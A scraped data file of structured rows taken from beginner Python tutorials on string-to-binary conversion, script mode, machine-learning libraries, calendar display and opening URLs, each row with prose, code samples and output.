293,['String to Binary in Python'],"['In this article, we will learn how we convert a string to its binary equivalent in Python.']","['https://www.javatpoint.com/what-is-script-mode-in-python', 'https://www.javatpoint.com/create-bmi-calculator-using-python', 'https://www.javatpoint.com/what-is-script-mode-in-python', 'https://www.javatpoint.com/create-bmi-calculator-using-python', 'https://www.javatpoint.com/what-is-script-mode-in-python']",[],[],[],[],[],"['We know that strings are a sequence of strings and are denoted with inverted commas.', 'Binary numbers are in the form 0s and 1s, the information is always encoded in the binary format since this is what the computer understands.', 'The methods of converting a string to the binary that we will use here are using join(), ord(), format() and bytearray().', 'We should take of the corresponding ASCII values of the characters that are present in the string and convert them into binary.', 'Let us have a look at the description of the functions that we have taken in our toolbox-', 'The following program shows how it can be done-', 'Explanation -', 'Let us understand what we have done in the above program-', 'In the next example, we will do the same thing by using bytearray().', 'Example - 2', 'Let us see how different the above approach was-']",[],[],"['# declaring the string', 'str_to_conv = ""Let\'s learn Python""', '# printing the string that will be converted', 'print(""The string that we have taken is "",str_to_conv)', '# using join() + ord() + format() to convert into binary', ""bin_result = ''.join(format(ord(x), '08b') for x in str_to_conv)"", '# printing the result', 'print(""The string that we obtain binary conversion is "",bin_result)', '# declaring the string', 'str_to_conv = ""Let\'s learn Python""', '# printing the string that will be converted', 'print(""The string that we have taken is "",str_to_conv)', '# using join(), format() and bytearray() to convert into binary', ""bin_result = ''.join(format(x,'08b') for x in bytearray(str_to_conv,'utf-8'))"", '# printing the result', 'print(""The string that we obtain binary conversion is "",bin_result)']","[""The string that we have taken is  Let's learn Python"", 'The string that we obtain binary conversion is  010011000110010101110100001001110111001100100000011011000110010101100001011100100110111000100000010100000111100101110100011010000110111101101110', ""The string that we have taken is  Let's learn Python"", 'The string that we obtain binary conversion is  010011000110010101110100001001110111001100100000011011000110010101100001011100100110111000100000010100000111100101110100011010000110111101101110']",[],"[""|||join()- It takes all the items and joins them to make a single entity(results in a single string).|||ord()- This method takes a character and converts it into the corresponding UNICODE value.|||format()- This method takes a value and inserts it where the placeholders are present, it is also used to merge the parts of a string at specified intervals.|||bytearray()- It returns an array of bytes.||||||First of all, we have declared the string that needs to be converted in binary with the value 'Let's learn Python'.|||The next step is to display the string we have created so that it is easy to comprehend with the help of output which one is our string and what is its binary equivalent.|||Then, we have used the format() method and specified its parameters as ord() and '08b' that takes each character from our string using the for loop and convert them into binary.|||The overall result is stored in the variable bin_result and finally, we display its value.||||||First of all, we have declared the string that needs to be converted in binary with the value 'Let's learn Python'.|||The next step is to display the string we have created so that it is easy to comprehend with the help of output which one is our string and what is its binary equivalent.|||Then we have used the bytearray() function, in which each character from the string is taken using for loop and converted into binary.|||The overall result is stored in the variable bin_result and finally, we display its value.|||""]"
294,['What is script mode in Python?'],"['We can integrate systems more efficiently and work very quickly with the help of the Python programming language. Python is a high-level, widely used general-purpose programming language, and it was designed with an emphasis on improving the readability of the code. The syntax of Python allows the programmers to express a concept in just a few lines of code rather than writing many lines of code like in other programming languages. We have the following two types of ways by which we can run our code in the Python programming language:']","['https://www.javatpoint.com/best-python-libraries-for-machine-learning', 'https://www.javatpoint.com/string-to-binary-in-python', 'https://www.javatpoint.com/best-python-libraries-for-machine-learning', 'https://www.javatpoint.com/string-to-binary-in-python', 'https://www.javatpoint.com/best-python-libraries-for-machine-learning']","['https://static.javatpoint.com/python/images/what-is-script-mode-in-python1.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python2.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python3.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python4.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python5.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python6.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python7.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python8.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python9.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python10.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python11.png', 'https://static.javatpoint.com/python/images/what-is-script-mode-in-python12.png']",[],"['Script mode in Python', 'Running a Python program in script mode', 'Advantages of script mode', 'Conclusion']","['Creating and saving a Python program script file:', 'Executing a Python Program Script', 'Method 1: Executing Python script using command prompt terminal:', 'Method 2: Executing Python script using Python IDE']",[],"['We have to follow the following steps in sequence in order to create and save a Python program script in our device:', 'Step 1: Open the text editor of Python or any other text editor of our choice (We will be using Python file editor here).', 'Step 2: Write the following Python program inside the text editor:', 'as we have written down:', 'A Python script having a Python program is successfully created and saved in our device, and now we can move forward to execute the script.', ""Let's learn about each method separately and execute the script file."", 'Now, after writing the directory path, press the enter key to locate the directory in the command prompt.', 'Step 2: Now, we have to write the script file name (with extension), and we have to write python before the script file name as follows:', 'Step 3: When we press the enter key, Python will start executing the script file in the command prompt terminal.', 'When we give the input values required in the code, we can even see the output of the program inside the command prompt.', ""That's how we can execute our Python script file in the command prompt terminal of our system."", 'Step 1: Open the Python IDE and open the script file in Python IDE using the open option given.', 'Step 2: Now, after opening the file, we will see the run option at the top:', ""Or, we can even use the 'F5' button shortcut to run the script file in the Python IDE."", ""That's how we can run or execute our Python script file using the Python IDE installed in our system.""]","['Now, we have to execute the Python program script in order to get the output of the program, and we have two ways for it. We are going to use the following two ways to execute a Python program script:', 'We can execute the script file (code.py) using the command prompt terminal of our system. The output of the file will also be displayed in the terminal shell. To execute the Python script file, we have to follow the following steps:', ""Step 1: Open the command prompt terminal and locate the directory where Python IDE is installed in our system (same where we have saved the Python script file). To locate the directory, we can use the directory path with 'cd' as we did:"", 'We can see that our script file (code.py) is started executing in the Python IDE, and once we give the required input values, we can see the output of the program inside the Python shell like following:', ""Now, last, let's look at the advantages of using the script mode of execution of a Python program over the interactive mode of execution. Following are the advantages of script mode of execution:"", 'In this tutorial, we have learned about the script mode execution in Python. We have learned the ways by which we can use the script mode execution to execute our Python program.', 'In last, we have seen the advantages of script mode execution in Python, and by looking at these advantages, we can easily say that why experts and programmers prefer script mode of execution over the interactive mode of execution.']","[""In this tutorial, we are going to learn about script mode in Python. We will learn what script mode is, how we can run our Python program using script mode, and the advantages of script mode. Let's start with first by understanding what script mode in Python is."", 'A system of writing scripts or anything is referred to as script etymologically. We first write a Python program inside a file (like a script) in the script mode, and then we execute the file after saving it in our system. So, Script mode in Python is where we first write the Python program inside a script file and execute it after that. We can execute the script of code either using the command prompt or using Python IDE installed in our system.', 'In the script mode, anytime we can view the code that we have written inside the file, and we can modify it before executing it next time. That\'s why editing a Python code becomes quite easy in script mode, and we can edit or view the code as many times as we want. We can write long pieces of code with script mode, and that\'s why many expert programmers prefer it over the interactive mode of execution. The Python file we create using the script mode is usually saved by default inside the folder where our Python IDE is installed, and it is saved with the Python file ("".py"") extension.', ""After we have learned about the script mode of execution in Python, now the question that comes to our mind is that how we can run a Python program using script mode. In this section, we will answer this question and learn the ways by which we can execute a Python script. But before executing a Python program script, let's first create one and save it in our system."", ""Step 3: After writing the Python program, we have to save the file inside the folder where our Python IDE is installed, and we have to save it with Python file extension, i.e., '.py' extension. We have saved the file with the 'code.py' name in our device for this program."", 'Other than executing the Python script through the command prompt terminal, we can also execute the script file by directly using the Python IDE installed in our system. To execute the Python script file using the Python IDE, we have to follow the following steps:']","['# Taking two variables from user', 'a = int(input(""Enter a number of integer value: ""))', 'b = int(input(""Enter second integer number: ""))', '# Addition of two input variables', 'c = a + b', '# Printing addition result in the output', 'print(""The addition of two numbers given by you is: "", c)']","['Enter a number of integer value: 38', 'Enter second integer number: 26', 'The addition of two numbers given by you is:  64']",[],"['|||Script mode of execution is very much suitable for us to write long Python programs (programs having more than a single code line).|||We can easily do the editing of our Python program inside the script mode.|||We can open our Python program as many times as we want inside the script mode.|||In script mode, we can even save the code we have written to use in the future.|||Script mode is execution is mostly preferred by all the experts and Python programmers.|||&&&|||Using interactive mode|||Using script mode||||||Executing using command prompt terminal|||Executing using Python IDE|||']"
295,['Best Python libraries for Machine Learning'],"['Machine learning is a science of programming the computer by which they can learn from different types of data. According to machine learning\'s definition of Arthur Samuel - ""Field of study that gives computers the ability to learn without being explicitly programmed"". The concept of machine learning is basically used for solving different types of life problems.']","['https://www.javatpoint.com/python-program-to-display-calendar-of-given-year', 'https://www.javatpoint.com/what-is-script-mode-in-python', 'https://www.javatpoint.com/https://www.javatpoint.com/numpy-tutorial', 'https://www.javatpoint.com/https://www.javatpoint.com/python-scipy', 'https://www.javatpoint.com/https://www.javatpoint.com/tensorflow', 'https://www.javatpoint.com/https://www.javatpoint.com/keras', 'https://www.javatpoint.com/https://www.javatpoint.com/pytorch', 'https://www.javatpoint.com/https://www.javatpoint.com/machine-learning', 'https://www.javatpoint.com/https://www.javatpoint.com/nlp', 'https://www.javatpoint.com/https://www.javatpoint.com/python-pandas', 'https://www.javatpoint.com/https://www.javatpoint.com/matplotlib', 'https://www.javatpoint.com/python-program-to-display-calendar-of-given-year', 'https://www.javatpoint.com/what-is-script-mode-in-python', 'https://www.javatpoint.com/python-program-to-display-calendar-of-given-year']","['https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning.jpg', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning1.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning2.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning2-output.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning3.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning4.jpg', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning5.jpg', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning6.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning7.jpg', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning8.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning9.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning9-output.png', 'https://static.javatpoint.com/python/images/best-python-libraries-for-machine-learning9-output2.png']",[],['Conclusion'],"['NumPy', 'SciPy', 'Scikit-learn', 'Theano', 'TensorFlow', 'Keras', 'PyTorch', 'Pandas', 'Matplotlib', 'Example 2:']",[],"['In this tutorial, we will discuss the best libraries of Python used for Machine Learning:', 'Example 1:', 'Example 2:', 'Example 1:']","['In previous days, the users used to perform tasks of machine learning by manually coding all the algorithms and using mathematical and statistical formulas.', 'Theano is a famous library of Python, which is used for defining, evaluating, and optimizing mathematical expressions, which also efficiently involves multi-dimensional arrays.', 'It is achieved by optimizing the utilization of CPU and GPU. As machine learning is all about mathematics and statistics, Theano makes it easy for the users to perform mathematical operations.', 'Matplotlib is a Python library that is used for data visualization. It is used by developers when they want to visualize the data and its patterns. It is a 2-D plotting library that is used to create 2-D graphs and plots.', 'In this tutorial, we have discussed about different libraries of Python which are used for performing Machine learning tasks. We have also shown different examples of each library.']","[""This process was time-consuming, inefficient, and tiresome compared to Python libraries, frameworks, and modules. But in today's world, users can use the Python language, which is the most popular and productive language for machine learning. Python has replaced many languages as it is a vast collection of libraries, and it makes work easier and simpler."", 'NumPy is the most popular library in Python. This library is used for processing large multi-dimensional array and matrix formation by using a large collection of high-level mathematical functions and formulas. It is mainly used for the computation of fundamental science in machine learning. It is widely used for linear algebra, Fourier transformation, and random number capabilities. There are other High-end libraries such as TensorFlow, which user NumPy as internal functioning for manipulation of tensors.', 'SciPy is a popular library among Machine Learning developers as it contains numerous modules for performing optimization, linear algebra, integration, and statistics. SciPy library is different from SciPy stack, as SciPy library is one of the core packages which made up the SciPy stack. SciPy library is used for image manipulation tasks.', 'Scikit-learn is a Python library which is used for classical machine learning algorithms. It is built on the top of two basic libraries of Python, that is NumPy and SciPy. Scikit-learn is popular in Machine learning developers as it supports supervised and unsupervised learning algorithms. This library can also be used for data-analysis, and data-mining process.', 'It is extensively used for unit-testing and self-verification for detecting and diagnosing different types of errors. Theano is a powerful library that can be used on a large scale computationally intensive scientific project. It is a simple and approachable library, which an individual can use for their projects.', 'TensorFlow is an open-source library of Python which is used for high performance of numerical computation. It is a popular library, which was developed by the Brain team in Google. TensorFlow is a framework that involves defining and running computations involving tensors. TensorFlow can be used for training and running deep neural networks, which can be used for developing several Artificial Intelligence applications.', 'Keras is a high-level neural networking API, which is capable of running on top of TensorFlow, CNTK and Theano libraries. It is a very famous library of Python among Machine learning developers. It can run without a glitch on both CPU and GPU. IT makes it really easy and simple for Machine Learning beginners and for designing a Neural Network. It is also used for fast prototyping.', 'PyTorch is also an open-source Python library for Machine Learning based on Torch, which is implemented in C language and used for Machine learning. It has numerous tools and libraries supported on the computer version, Natural Language Processing (NLP) and many other Machine Learning programs. This library also allows users to perform computational tasks on Tensor with GPU acceleration.', 'Pandas is a Python library that is mainly used for data analysis. The users have to prepare the dataset before using it for training the machine learning. Pandas make it easy for the developers as it is developed specifically for data extraction. It has a wide variety of tools for analysing data in detail, providing high-level data structures.', 'It has a module pyplot which is used for plotting graphs, and it provides different features for control line styles, font properties, formatting axes and many more. Matplotlib provides different types of graphs and plots such as histograms, error charts, bar charts and many more.']","['import numpy as nup', '# Then, create two arrays of rank 2', 'K = nup.array([[2, 4], [6, 8]])', 'R = nup.array([[1, 3], [5, 7]])', '# Then, create two arrays of rank 1', 'P = nup.array([10, 12])', 'S = nup.array([9, 11])', '# Then, we will print the Inner product of vectors', 'print (""Inner product of vectors: "", nup.dot(P, S), ""\\n"")', '# Then, we will print the Matrix and Vector product', 'print (""Matrix and Vector product: "", nup.dot(K, P), ""\\n"")', '# Now, we will print the Matrix and matrix product', 'print (""Matrix and matrix product: "", nup.dot(K, R))', 'from scipy import signal as sg', 'import numpy as nup', 'K = nup.arange(45).reshape(9, 5)', 'domain_1 = nup.identity(3)', ""print (K, end = 'KK')"", 'print (sg.order_filter (K, domain_1, 1))', 'from scipy.signal import chirp as cp', 'from scipy.signal import spectrogram as sp', 'import matplotlib.pyplot as plot', 'import numpy as nup', 't_T = nup.linspace(3, 10, 300)', ""w_W = cp(t_T, f0 = 4, f1 = 2, t1 = 5, method = 'linear')"", 'plot.plot(t_T, w_W)', 'plot.title (""Linear Chirp"")', ""plot.xlabel ('Time in Seconds)')"", 'plot.show()', 'from sklearn import datasets as ds', 'from sklearn import metrics as mt', 'from sklearn.tree import DecisionTreeClassifier as dtc', '# load the iris datasets', 'dataset_1 = ds.load_iris()', '# fit a CART model to the data', 'model_1 = dtc()', 'model_1.fit(dataset_1.data, dataset_1.target)', 'print(model)', '# make predictions', 'expected_1 = dataset_1.target', 'predicted_1 = model_1.predict(dataset_1.data)', '# summarize the fit of the model', 'print (mt.classification_report(expected_1, predicted_1))', 'print(mt.confusion_matrix(expected_1, predicted_1))', 'import theano as th', 'import theano.tensor as Tt', ""k = Tt.dmatrix('k')"", 'r = 1 / (1 + Tt.exp(-k))', 'logistic_1 = th.function([k], r)', 'logistic_1([[0, 1], [-1, -2]])', 'import tensorflow as tsf', '# Initialize two constants', 'K_1 = tsf.constant([2, 4, 6, 8])', 'K_2 = tsf.constant([1, 3, 5, 7])', '# Multiply', 'result = tsf.multiply(K_1, K_2)', '# Initialize the Session', 'sess_1 = tsf.Session()', '# Print the result', 'print (sess_1.run(result))', '# Close the session', 'sess_1.close()', 'import numpy as nup', 'from tensorflow import keras as ks', 'from tensorflow.keras import layers as ls', 'number_classes = 10', 'input_shapes = (28, 28, 1)', '# Here, we will import the data, and split it between train and test sets', '(x_1_train, y_1_train), (x_2_test, y_2_test) = ks.datasets.mnist.load_data()', '# now, we will Scale images to the [0, 1] range', 'x_1_train = x_1_train.astype(""float32"") / 255', 'x_2_test = x_2_test.astype(""float32"") / 255', '# we have to make sure that the images have shape (28, 28, 1)', 'x_1_train = nup.expand_dims(x_1_train, -1)', 'x_2_test = nup.expand_dims(x_2_test, -1)', 'print (""x_train shape:"", x_1_train.shape)', 'print (x_1_train.shape[0], ""Training samples"")', 'print (x_2_test.shape[0], ""Testing samples"")', '# Then we will convert class vectors to binary class matrices', 'y_1_train = ks.utils.to_categorical(y_1_train, number_classes)', 'y_2_test = ks.utils.to_categorical(y_2_test, number_classes)', 'model_1 = ks.Sequential(', 'ks.Input(shape = input_shapes),', 'ls.Conv2D(32, kernel_size = (3, 3), activation = ""relu""),', 'ls.MaxPooling2D(pool_size = (2, 2)),', 'ls.Conv2D(64, kernel_size = (3, 3), activation = ""relu""),', 'ls.MaxPooling2D(pool_size = (2, 2)),', 'ls.Flatten(),', 'ls.Dropout(0.5),', 'ls.Dense(number_classes, activation = ""softmax""),', 'model_1.summary()', 'import torch as tch', 'd_type = tch.float', 'device_1 = tch.device(""cpu"")', '# Use device = tch.device(""cuda:0"") for GPU', '# Here, N_1 is batch size; D_in_1 is input dimension;', '# H_1 is hidden dimension; D_out_1 is output dimension.', 'N_1 = 62', 'D_in_1 = 1000', 'H_1 = 110', 'D_out_1 = 11', '# Now, we will create random input and output data', 'K = tch.randn(N_1, D_in_1, device = device_1, dtype = d_type)', 'R = tch.randn(N_1, D_out_1, device = device_1, dtype = d_type)', '# Then, we will Randomly initialize weights', 'K_1 = tch.randn(D_in_1, H_1, device = device_1, dtype = d_type)', 'K_2 = tch.randn(H_1, D_out_1, device = device_1, dtype = d_type)', 'learning_rate_1 = 1e-6', 'for Q in range(500):', '# Now, we will put Forward pass: compute predicted y', 'h_1 = K.mm(K_1)', 'h_relu_1 = h_1.clamp(min = 0)', 'y_pred_1 = h_relu_1.mm(K_2)', '# Compute and print loss', 'loss = (y_pred_1 - R).pow(2).sum().item()', 'print (Q, loss)', '# Then we will Backprop to compute gradients of w1 and w2 with respect to loss', 'grad_y_pred = 2.0 * (y_pred_1 - R)', 'grad_K_2 = h_relu_1.t().mm(grad_y_pred)', 'grad_h_relu = grad_y_pred.mm(K_2.t())', 'grad_h = grad_h_relu.clone()', 'grad_h[h_1 < 0] = 0', 'grad_K_1 = K.t().mm(grad_h)', '# Then we will Update the weights by using gradient descent', 'K_1 -= learning_rate_1 * grad_K_1', 'K_2 -= learning_rate_1 * grad_K_2', 'import pandas as pad', 'data_1 = {""Countries"": [""Bhutan"", ""Cape Verde"", ""Chad"", ""Estonia"", ""Guinea"", ""Kenya"", ""Libya"", ""Mexico""],', '""capital"": [""Thimphu"", ""Praia"", ""N\'Djamena"", ""Tallinn"", ""Conakry"", ""Nairobi"", ""Tripoli"", ""Mexico City""],', '""Currency"": [""Ngultrum"", ""Cape Verdean escudo"", ""CFA Franc"", ""Estonia Kroon; Euro"", ""Guinean franc"", ""Kenya shilling"", ""Libyan dinar"", ""Mexican peso""],', '""population"": [20.4, 143.5, 12.52, 135.7, 52.98, 76.21, 34.28, 54.32] }', 'data_1_table = pad.DataFrame(data_1)', 'print(data_1_table)', 'import matplotlib.pyplot as plot', 'import numpy as nup', '# Prepare the data', 'K = nup.linspace(2, 4, 8)', 'R = nup.linspace(5, 7, 9)', 'Q = nup.linspace(0, 1, 3)', '# Plot the data', ""plot.plot(K, K, label = 'K')"", ""plot.plot(R, R, label = 'R')"", ""plot.plot(Q, Q, label = 'Q')"", '# Add a legend', 'plot.legend()', '# Show the plot', 'plot.show()', 'import matplotlib.pyplot as plot', '# Creating dataset-1', 'K_1 = [8, 4, 6, 3, 5, 10,', '13, 16, 12, 21]', 'R_1 = [11, 6, 13, 15, 17, 5,', '3, 2, 8, 19]', '# Creating dataset2', 'K_2 = [6, 9, 18, 14, 16, 15,', '11, 16, 12, 20]', 'R_2 = [16, 4, 10, 13, 18,', '20, 6, 2, 17, 15]', 'plot.scatter(K_1, R_1, c = ""Black"",', 'linewidths = 2,', 'marker = ""s"",', 'edgecolor = ""Brown"",', 's = 50)', 'plot.scatter(K_2, R_2, c = ""Purple"",', 'linewidths = 2,', 'marker = ""^"",', 'edgecolor = ""Grey"",', 's = 200)', 'plt.xlabel (""X-axis"")', 'plt.ylabel (""Y-axis"")', 'print (""Scatter Plot"")', 'plt.show()']","['Inner product of vectors: 222', 'Matrix and Vector product: [ 68 156]', 'Matrix and matrix product: [[22 34]', '[46 74]]', 'r (K, domain_1, 1))', 'Output:', '[[ 0  1  2  3  4]', '[ 5  6  7  8  9]', '[10 11 12 13 14]', '[15 16 17 18 19]', '[20 21 22 23 24]', '[25 26 27 28 29]', '[30 31 32 33 34]', '[35 36 37 38 39]', '[40 41 42 43 44]] KK [[ 0.  1.  2.  3.  0.]', '[ 5.  6.  7.  8.  3.]', '[10. 11. 12. 13.  8.]', '[15. 16. 17. 18. 13.]', '[20. 21. 22. 23. 18.]', '[25. 26. 27. 28. 23.]', '[30. 31. 32. 33. 28.]', '[35. 36. 37. 38. 33.]', '[ 0. 35. 36. 37. 38.]]', 'DecisionTreeClassifier()', 'precision    recall f1-score   support', '0       1.00      1.00      1.00        50', '1       1.00      1.00      1.00        50', '2       1.00      1.00      1.00        50', 'accuracy                           1.00       150', 'macro avg       1.00      1.00      1.00       150', 'weighted avg       1.00      1.00      1.00       150', '[[50  0  0]', '[ 0 50  0]', '[ 0  0 50]]', 'array([[0.5, 0.71135838],', '[0.26594342, 0.11420192]])', '[ 2 12 30 56]', 'x_train shape: (60000, 28, 28, 1)', '60000 Training samples', '10000 Testing samples', 'Model: ""sequential""', '_________________________________________________________________', 'Layer (type)                 Output Shape              Param #', '=================================================================', 'conv2d (Conv2D)              (None, 26, 26, 32)        320', '_________________________________________________________________', 'max_pooling2d (MaxPooling2D) (None, 13, 13, 32)        0', '_________________________________________________________________', 'conv2d_1 (Conv2D)            (None, 11, 11, 64)        18496', '_________________________________________________________________', 'max_pooling2d_1 (MaxPooling2 (None, 5, 5, 64)          0', '_________________________________________________________________', 'flatten (Flatten)            (None, 1600)              0', '_________________________________________________________________', 'dropout (Dropout)            (None, 1600)              0', '_________________________________________________________________', 'dense (Dense)                (None, 10)                16010', '=================================================================', 'Total params: 34,826', 'Trainable params: 34,826', 'Non-trainable params: 0', '_________________________________________________________________', '0 35089116.0', '1 33087792.0', '2 42227192.0', '3 56113208.0', '4 61125684.0', '5 45541204.0', '6 21011108.0', '7 6972017.0', '8 2523046.5', '9 1342124.5', '10 950067.5625', '11 753290.25', '12 620475.875', '13 519006.71875', '14 437975.9375', '15 372063.125', '16 317840.8125', '17 272874.46875', '18 235348.421875', '.', '.', '.', '497 7.426088268402964e-05', '498 7.348413055296987e-05', '499 7.258950790856034e-05', 'Countries      capital             Currency  population', '0      Bhutan      Thimphu             Ngultrum       20.40', '1  Cape Verde        Praia  Cape Verdean escudo      143.50', ""2        Chad    N'Djamena            CFA Franc       12.52"", '3     Estonia      Tallinn  Estonia Kroon; Euro      135.70', '4      Guinea      Conakry        Guinean franc       52.98', '5       Kenya      Nairobi       Kenya shilling       76.21', '6       Libya      Tripoli         Libyan dinar       34.28', '7      Mexico  Mexico City         Mexican peso       54.32']",[],['|||NumPy|||SciPy|||Scikit-learn|||Theano|||TensorFlow|||Keras|||PyTorch|||Pandas|||Matplotlib|||']
296,['Python Program to Display Calendar of Given Year'],"['In this tutorial, we will learn how to display the calendar of any month of any year using Python.']","['https://www.javatpoint.com/how-to-open-url-in-python', 'https://www.javatpoint.com/best-python-libraries-for-machine-learning', 'https://www.javatpoint.com/how-to-open-url-in-python', 'https://www.javatpoint.com/best-python-libraries-for-machine-learning', 'https://www.javatpoint.com/how-to-open-url-in-python']",[],[],['Conclusion'],[],[],"['In this tutorial, we have discussed how a user can display the calendar in Python.']","['In the code below, we will import the ""calendar"" module. It has an inbuilt ""month()"" function, which takes the year and month of which the user wants to display the calendar.']",[],"['import calendar', 'year = int(input (""Please enter the Year: "")) # Here, it will take the year', 'month = int(input (""Please enter the month: ""))    # Here, it will take the month', '# Now, we will display the calendar', 'Print (""The Calendar of: "", calendar.month(year, month))']","['Please enter the Year:  1919', 'Please enter the month:  01', 'The Calendar of:      January 1919', 'Mo Tu We Th Fr Sa Su', '1     2    3  4  5', '6     7   8      9 10 11 12', '13 14 15 16 17 18 19', '20 21 22 23 24 25 26', '27 28 29 30 31', 'Please enter the Year:  2022', 'Please enter the month:  10', 'The Calendar of:      October 2022', 'Mo Tu We Th Fr Sa Su', '1  2', '3    4    5     6    7  8  9', '10 11 12 13 14 15 16', '17 18 19 20 21 22 23', '24 25 26 27 28 29 30', '31']",[],[]
297,['How to open URL in Python'],"['Python is a very strong and advanced programming language, and we can perform various tasks and functions using Python. One of such tasks that we can easily do with the help of Python is opening a url with a Python program. In this tutorial, we are going to discuss the methods or ways which we can use to open a url in Python.']","['https://www.javatpoint.com/broken-pipe-error-in-python', 'https://www.javatpoint.com/python-program-to-display-calendar-of-given-year', 'https://www.javatpoint.com/broken-pipe-error-in-python', 'https://www.javatpoint.com/python-program-to-display-calendar-of-given-year', 'https://www.javatpoint.com/broken-pipe-error-in-python']","['https://static.javatpoint.com/python/images/how-to-open-url-in-python1.png', 'https://static.javatpoint.com/python/images/how-to-open-url-in-python1.png', 'https://static.javatpoint.com/python/images/how-to-open-url-in-python2.png', 'https://static.javatpoint.com/python/images/how-to-open-url-in-python3.png', 'https://static.javatpoint.com/python/images/how-to-open-url-in-python4.png']",[],['Opening url in Python'],"['Method 1: Using urllib library function', 'Method 2: Using webbrowser library function:', 'Method 3: Using selenium library function:', 'Installation of selenium library', 'Installation of web drivers:']",[],"['We are going to use the following methods in this section to open a given url using a Python program:', 'Example 1: Look at the following Python program where we using urlopen() function:', 'Example 2: Look at the following Python program:', 'To use the selenium library functions with URLs, we also have to install the web drivers provided by selenium for the respective browser.', 'Web driver for Safari:', 'Web driver for Firefox:', 'Web driver for Chrome:', 'Example 3: Look at the following Python program:']","['We can use a Python program to open a url using the Python script, and for this, we can use a different set of libraries. We have different methods in which we will use different libraries and their functions to open a url given in the program.', 'Urllib is an inbuilt Python module that we can use to work on urls and open url using a Python program. In the urllib module, various classes and functions are defined, which help us to perform various url actions using a Python program.', ""Explanation: We have opened the url of 'Python tutorial in JavaTpoint' in our browser by giving the url link inside the urlopen() function in the program."", 'Explanation: We have opened the url in the chrome browser of our system by using the open_new_tab() function of the webbrowser module and providing url link in it.', 'We have successfully installed the selenium library in our system, as we can see above. Currently, the Python versions that support the Selenium library are Python 2.7, Python 3.5 and all the higher versions.', 'By using any of the three methods we have mentioned in this tutorial, we can easily open the url inside the web browser of our system with the help of a Python program.']","['In all three libraries, as we have mentioned above, the first two libraries are generally coming pre-installed with the latest Python versions. We are going to discuss all three methods and we will use a Python program in each to better understand their implementation.', 'We will use the urlopen() method by importing urllib.request library in the program, and then we give url inside this function so that it will open in the browser of our device. To better understand the implementation of this method of using urlopen(), we will use it in an example Python program and open a link through it.', 'Now, we will use the webbrowser library, which is a library in Python to work with the web-based content. An environment is created for the user by using the webbrowser module that enables the user to display various web-based contents in the Python application itself.', 'Before we start working with the webbrowser library, we should make sure that it is properly installed in our system where we are running Python. And, if the webbrowser library is not present in the system, then we can install the same by using the following command in the command prompt of our device.', 'Now, we will start working with the webbrowser library and open url with the webbrowser library; we will use the open() function of it in the program. To better understand the implementation of this method of using the webbrowser library for opening url in Python, we will use it in an example Python program and open a link through it.', 'Selenium library is a powerful tool provided of Python, and we can use it for controlling the URL links and web browser of our system through a Python program. We can also open url links in our Python program using the selenium library functions. The binding of selenium library functions in Python provides us with some very convenient APIs to access the WebDrivers of selenium modules like Chrome, Firefox, Microsoft Edge etc.', 'Before we start working with the selenium library, we should make sure that the selenium library is properly installed in our system where we are running Python. To install the selenium library, we have to use the following command with the pip installer in the command prompt terminal:', 'WebDriver is a package provided by the selenium to interact with the web browser present in our system. The WebDrivers interacts with the remote web server or the web browser of the system using a wire protocol common for all the web browsers. Here, we are providing links to download the web drivers of some famous browsers and using these links; you can download web drivers for the web browser present in the system.', 'Now, we will start working with the selenium library and open url by using the selenium library functions in the program. To better understand the implementation of this method of using selenium library for opening url in Python, we will use it in an example Python program and open a link through it.', 'Explanation: After importing the webdrivers from the selenium library, we imported the keys from the webdrivers in the program. We provided the path for the chrome webdriver we downloaded using the above-given links. Then, with the help of the get() function with the driver, we have opened the url in the browser by giving a link in the get() method.']","['# Importing urllib request module in the program', 'import urllib.request', '# Using urlopen() function with url in it', ""webUrl = urllib.request.urlopen('https://www.javatpoint.com/python-tutorial')"", 'pip install webbrowser', '# Import webbrowser module in the program', 'import webbrowser', '# Add a URL of JavaTpoint to open it in a browser', ""url= 'https://www.javatpoint.com/python-tutorial'"", '# Open the URL using open() function of module', 'webbrowser.open_new_tab(url)', 'pip install selenium', 'https://webkit.org/blog/6900/webdriver-support-in-safari-10/', 'https://github.com/mozilla/geckodriver/releases', 'https://sites.google.com/a/chromium.org/chromedriver/downloads', '# Import webdriver from selenium library', 'from selenium import webdriver', '# Importing keys in the program from webdriver', 'from selenium.webdriver.common.keys import Keys', '# Providing the path of chrome Web driver', ""driver = webdriver.Chrome('C:/Users/Manish/Downloads/chromedriver_win32/chromedriver.exe')"", '# Opening url by get() method', 'driver.get(""https://www.javatpoint.com/python-tutorial"")']",[],[],['|||Using Urllib library function|||Using webbrowser library function|||Using selenium library function|||']
